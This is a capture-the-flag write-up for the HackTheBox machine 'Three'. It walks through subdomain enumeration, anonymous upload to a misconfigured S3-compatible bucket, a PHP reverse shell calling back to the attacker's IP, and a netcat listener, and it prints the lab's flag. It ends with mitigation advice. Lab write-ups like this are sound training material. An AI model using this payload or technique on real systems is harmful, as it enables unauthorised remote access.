# Three - HackTheBox Starting Point Writeup

**Date:** 2026-04-12
**OS:** Linux
**IP Address:** 10.129.23.35
**Difficulty:** Very Easy (Tier 1)

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Three**. The machine demonstrates a common cloud misconfiguration involving an AWS S3-compatible service (LocalStack) that allows anonymous access and file uploads, leading to Remote Code Execution (RCE).

*   **Initial Access:** Gained by identifying an exposed S3 bucket subdomain (`s3.thetoppers.htb`) and uploading a PHP reverse shell via the AWS CLI.
*   **Privilege Escalation:** Access was limited to `www-data`. The flag was found in the web directory.
*   **Key Learning Points:**
    *   Subdomain enumeration is critical for identifying hidden services.
    *   S3 buckets must be configured to deny anonymous write access.
    *   Always verify internal services (S3-compatible APIs) are not exposed to the public internet.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22 | SSH | OpenSSH 7.6p1 | Ubuntu Linux |
| 80 | HTTP | Apache httpd 2.4.29 | The Toppers website |

**Nmap Command:**
```bash
nmap -sV -sC -oN nmap/Three -p22,80 10.129.23.35
```

## 2.2. Web Enumeration

Visiting the website at `http://10.129.23.35` reveals a static landing page for "The Toppers".

### Host File Update
To properly enumerate the site and its subdomains, we add the IP to our `/etc/hosts` file:
```bash
echo "10.129.23.35 thetoppers.htb" | sudo tee -a /etc/hosts
```

### Subdomain Enumeration (Fuzzing)
We use `gobuster` to search for subdomains that might be hosted on the same server. We use the `vhost` mode to check for different Host headers.

```bash
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

**Results:**
Found `s3.thetoppers.htb`. We add this to our `/etc/hosts` as well:
```bash
echo "10.129.23.35 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```


---

# 3. Initial Access

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Misconfigured AWS S3 Bucket (Anonymous Access).
*   **Vector:** The subdomain `s3.thetoppers.htb` serves an S3-compatible API (LocalStack) that allows listing and uploading files without authentication.

## 3.2. Exploitation Path

### 1. AWS CLI Configuration
First, we configure the AWS CLI with dummy credentials to satisfy the tool's requirements, as seen in the logs:
```bash
aws configure
# AWS Access Key ID [****************lol]: 
# AWS Secret Access Key [****************lol]: 
# Default region name [lol]: 
# Default output format [lol]: 
```

### 2. Enumerating the S3 Bucket
We attempt to list the contents of the bucket using the custom endpoint. After a few syntax trials, the successful command was:
```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
```
**Output:**
```text
                           PRE images/
2026-04-12 17:05:42          0 .htaccess
2026-04-12 17:05:42      11952 index.php
```

### 3. Uploading the Payload
We initially created a simple PHP one-liner in `revshell.php`:
```php
<?php system("php -r '\$sock=fsockopen(\"10.10.14.240\",4444);system(\"sh <&3 >&3 2>&3\");'"); ?>
```

Upon confirming it worked, we uploaded it to the bucket:
```bash
aws s3 cp revshell.php --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
```

### 4. Executing the Shell
In a separate terminal, we start our listener:
```bash
nc -lnvp 4444
```

Then trigger the shell:
```bash
curl http://thetoppers.htb/revshell.php
```

---

# 4. Post-Exploitation

## 4.1. Local Enumeration
After gaining a shell as `www-data`, we explored the system as documented in the second tmux log:
1.  **System Info:** `Linux three 4.15.0-189-generic`
2.  **Root Access Check:** Attempted `cd /root` (Permission denied).
3.  **Home Directory:** Checked `/home/svc`, found it for user `svc` but with no accessible flag.
4.  **Privilege Check:** Attempted `sudo -l`, but no tty was present to enter a password.

## 4.2. Flag Retrieval
The flag was eventually discovered in the `/var/www/` directory.

```bash
cd /var/www
ls
# flag.txt  html
cat flag.txt
# a980d99281a28d638ac68b9bf9453c2b
```

**Flag:** `a980d99281a28d638ac68b9bf9453c2b`

---

# 5. Recommendations & Mitigation
1.  **Restrict S3 Access:** Implement proper Bucket Policies and Access Control Lists (ACLs) to prevent anonymous reads/writes.
2.  **Disable Direct Internet Access:** Ensure that internal storage services are only accessible through authorized gateways or VPNs.
3.  **Sanitize File Uploads:** If file uploads are necessary, validate file types and prevent execution in upload directories.
